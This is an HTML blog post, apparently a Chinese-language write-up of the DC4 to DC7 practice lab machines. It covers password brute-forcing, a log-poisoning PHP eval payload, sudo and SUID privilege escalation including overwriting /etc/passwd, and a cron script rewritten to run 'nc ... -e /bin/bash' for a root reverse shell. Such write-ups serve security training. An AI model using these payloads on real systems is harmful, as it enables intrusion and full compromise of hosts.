@@ -1,0 +1,758 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-cn">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="渗透测试,靶机攻防,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言总结一下几个靶机主要是DC4-DC7的一些思路，这一次会在省略一些不必要的细节。 实验环境以及工具 主要虚拟设备同上文。由于我之后给kali加了网卡，重新设置了下网络，使得kali和靶机在同一个网段下，可以直接使用反弹shell到msf上。经过调整后各个虚拟机的网络配置如下：  kali en0 10.211.55.18 en1 192.168.56.10 本机 192.168.56.2 DC">
+<meta name="keywords" content="渗透测试,靶机攻防">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC4-7">
+<meta property="og:url" content="http://www.star123.top/2020/01/26/DC4-7/index.html">
+<meta property="og:site_name" content="star&#39;s blog">
+<meta property="og:description" content="前言总结一下几个靶机主要是DC4-DC7的一些思路，这一次会在省略一些不必要的细节。 实验环境以及工具 主要虚拟设备同上文。由于我之后给kali加了网卡，重新设置了下网络，使得kali和靶机在同一个网段下，可以直接使用反弹shell到msf上。经过调整后各个虚拟机的网络配置如下：  kali en0 10.211.55.18 en1 192.168.56.10 本机 192.168.56.2 DC">
+<meta property="og:locale" content="zh-cn">
+<meta property="og:image" content="https://i.loli.net/2020/01/26/eNdVKtI7yDfRCg9.png">
+<meta property="og:image" content="https://i.loli.net/2020/01/26/K8hOcDpfMXldYes.png">
+<meta property="og:image" content="https://i.loli.net/2020/01/27/F6BWQohbumt1Y8V.png">
+<meta property="og:image" content="https://i.loli.net/2020/01/27/abCYF5QoJjvx3N6.png">
+<meta property="og:image" content="https://i.loli.net/2020/01/27/TBE3VtFXL89bDHJ.png">
+<meta property="og:updated_time" content="2020-01-27T08:21:17.520Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DC4-7">
+<meta name="twitter:description" content="前言总结一下几个靶机主要是DC4-DC7的一些思路，这一次会在省略一些不必要的细节。 实验环境以及工具 主要虚拟设备同上文。由于我之后给kali加了网卡，重新设置了下网络，使得kali和靶机在同一个网段下，可以直接使用反弹shell到msf上。经过调整后各个虚拟机的网络配置如下：  kali en0 10.211.55.18 en1 192.168.56.10 本机 192.168.56.2 DC">
+<meta name="twitter:image" content="https://i.loli.net/2020/01/26/eNdVKtI7yDfRCg9.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.star123.top/2020/01/26/DC4-7/">
+
+
+
+
+
+  <title>DC4-7 | star's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">star's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2020/01/26/DC4-7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="star">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="star's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">DC4-7</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-26T20:40:01+08:00">
+                2020-01-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>总结一下几个靶机主要是DC4-DC7的一些思路，这一次会在省略一些不必要的细节。</p>
+<h2 id="实验环境以及工具"><a href="#实验环境以及工具" class="headerlink" title="实验环境以及工具"></a>实验环境以及工具</h2><ul>
+<li><p>主要虚拟设备同上文。由于我之后给kali加了网卡，重新设置了下网络，使得kali和靶机在同一个网段下，可以直接使用反弹shell到msf上。经过调整后各个虚拟机的网络配置如下：</p>
+<ul>
+<li>kali en0 10.211.55.18 en1 192.168.56.10</li>
+<li>本机 192.168.56.2</li>
+<li>DC7 192.168.56.100</li>
+<li>DC4 192.168.56.101</li>
+<li>DC5 192.168.56.102</li>
+<li>DC6 192.168.56.103</li>
+</ul>
+</li>
+<li><p>用到的工具为kali虚拟机中自带的工具和一些提权脚本。</p>
+</li>
+</ul>
+<h2 id="涉及的知识点"><a href="#涉及的知识点" class="headerlink" title="涉及的知识点"></a>涉及的知识点</h2><ul>
+<li>弱口令爆破</li>
+<li>敏感信息收集</li>
+<li>任意命令执行，文件包含等常见web漏洞</li>
+<li>简单的社工收集</li>
+<li>drupal 高版本后台getshell</li>
+<li>wordpress user-role-editor模块权限提升漏洞</li>
+<li>sudo的错误配置</li>
+<li>错误配置的计划任务</li>
+</ul>
+<h2 id="DC4"><a href="#DC4" class="headerlink" title="DC4"></a>DC4</h2><ol>
+<li>burp 抓包尝试用户名admin，使用rockyou爆破密码，弱口令登录后台。</li>
+<li>进后台发现有命令执行的功能模块，抓包测试任意命令执行。</li>
+</ol>
+<p><img src="https://i.loli.net/2020/01/26/eNdVKtI7yDfRCg9.png" alt="image.png"></p>
+<p>看下是否可以写shell，web根目录web用户无权限写，那么尝试一句话反弹。反弹成功。</p>
+<ol start="3">
+<li><p>收集敏感信息，发现在jim目录下发现old-password.bak文件。立即爆破ssh密码<br>jibril04，切换用户。</p>
+</li>
+<li><p>验证sudo空密码并检查邮件并在/var/mail/jim邮箱中发现charles的密码^xHhA&amp;hvim0y，再次切换用户。</p>
+</li>
+<li><p>发现charless可以sudo以root权限使用teehee。查看手册后发现可以直接修改/etc/passwd文件。</p>
+<p> root:$1$EoKh.GjD$VoKnA1qNX8tBf1TQlcKYh/:0:0:root:/root:/bin/bash</p>
+<p> 修改root密码并登陆获得flag</p>
+</li>
+</ol>
+<p>需要注意的是，为了防止/etc/passwd 被写坏的情况建议先存个快照。</p>
+<h2 id="DC5"><a href="#DC5" class="headerlink" title="DC5"></a>DC5</h2><p>这题一开始我是蒙蔽的，后来看了wp才知道是文件包含。</p>
+<ol>
+<li><p>依次验证各个文件，发现thankphp页面footer的日期会变化。尝试参数发现file参数控制文件包含，尝试包含nginx的access.log getshell。 这里需要注意的是传过去的数据要能够正确被包含，需要urldecode一下。</p>
+<p>类似 xxx/&lt;?php eval($_POST[1]);?&gt;这样的，最后包含成功结果如下：</p>
+<p><img src="https://i.loli.net/2020/01/26/K8hOcDpfMXldYes.png" alt="image.png"></p>
+</li>
+<li><p>检查suid, 发现screen可以利用<br>刚好发现一个screen 4.50的 利用漏洞，上传使用即可获得root权限</p>
+</li>
+</ol>
+<h2 id="DC6"><a href="#DC6" class="headerlink" title="DC6"></a>DC6</h2><ol>
+<li>访问发现是wordpress， 直接上wpscan枚举用户并按照提示爆破用户密码。发现只有mark helpdesk01可用，即登录。</li>
+<li>根据Activity Monitor 模块查找admin的活动，127.0.0.1和192.168.0.100，意外发现wordpress使用user_role_editor插件，并且找到该插件的利用模块。</li>
+<li>将该用户提权，然后修改wordpress样式表getshell，并获取反弹shell。</li>
+<li>收集敏感信息后，在mark目录下找到graham的密码GSo7isUM1D4</li>
+<li>切换用户查看sudo配置,<br>发现可以使用无jens密码执行backups脚本, 使用jens用户时,发现sudo可以无密码root执行nmap故使用nmap提取即可</li>
+</ol>
+<h2 id="DC7"><a href="#DC7" class="headerlink" title="DC7"></a>DC7</h2><p>这道题还是比较别致的，一开始还真没看到那个@DC7USER的问题。</p>
+<ol>
+<li><p>扫了下端口，开了22和80。看了下作者的提示，需要考虑一下环境以外的因素。那估计是要社工？在打drupal8的几个cve失败后，注意到@DC7USER和通常的drupal版本不同,谷歌DC7USER，发现Dc7User的github仓库，在config.php找到mysql的登录密码。猜测mysql账号和密码和cms或者ssh账号密码是同一套。尝试ssh登录成功。</p>
+<p> <img src="https://i.loli.net/2020/01/27/F6BWQohbumt1Y8V.png" alt="image.png"></p>
+</li>
+<li><p>检查sudo发现没有异常，检查suid和mailbox，发现有一个/opt/scripts/backups.sh脚本，是以root权限运行的，从时间上来看是15分钟运行一次。去检查脚本所在文件权限。</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwxrwxr-x 1 root www-data   38 Jan 26 14:18 backups.sh</span><br></pre></td></tr></table></figure>
+
+<p> 这意味着root和www-data用户同时拥有写该文件的权限，也就是说如果能够拿到一个webshell就可以修改脚本弹一个rootshell到本地。</p>
+</li>
+<li><p>我们看一下脚本里面的逻辑，找一找能用的东西，发现一个gpg可以通过解密sql找出admin的密码，发现drush。drush提供了各种管理drupal cms的各种操作，其中包括了账号密码重置。这里就直接重置admin密码为123456，登录次数过多的话可以新创建一个admin权限的账号也一样。这样我们就进了后台。</p>
+<p> <img src="https://i.loli.net/2020/01/27/abCYF5QoJjvx3N6.png" alt="image.png"></p>
+</li>
+<li><p>检查了下版本发现是8.7.6，反序列化估计就不能用了。剩下的有两条路，一个是安装<br>PHP Filter模块，使用basic page写webshell，另外一个是通过上传theme功能上传包含.htaccess的webshell压缩包。这里由于权限的缘故，我选择了修改basic page  getshell。</p>
+<p> <img src="https://i.loli.net/2020/01/27/TBE3VtFXL89bDHJ.png" alt="image.png"></p>
+<p> 之后修改backup脚本为</p>
+ <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.56.2 12345 -t -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p> 等待15分钟的间隔即可获取一个具有root权限的反弹shell。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> 感觉还是一个思路的问题，思路有了其实这几个靶机还不是很难。另外就是等网好了的时候。我想试试是不是可以通过上传theme拿shell。</p>
+</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+          
+            <a href="/tags/靶机攻防/" rel="tag"># 靶机攻防</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/21/DC2-3wp/" rel="next" title="DC2-3wp">
+                <i class="fa fa-chevron-left"></i> DC2-3wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">star</p>
+              <p class="site-description motion-element" itemprop="description">ctf wp and technologies about security</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验环境以及工具"><span class="nav-number">2.</span> <span class="nav-text">实验环境以及工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#涉及的知识点"><span class="nav-number">3.</span> <span class="nav-text">涉及的知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DC4"><span class="nav-number">4.</span> <span class="nav-text">DC4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DC5"><span class="nav-number">5.</span> <span class="nav-text">DC5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DC6"><span class="nav-number">6.</span> <span class="nav-text">DC6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DC7"><span class="nav-number">7.</span> <span class="nav-text">DC7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">8.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">star</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
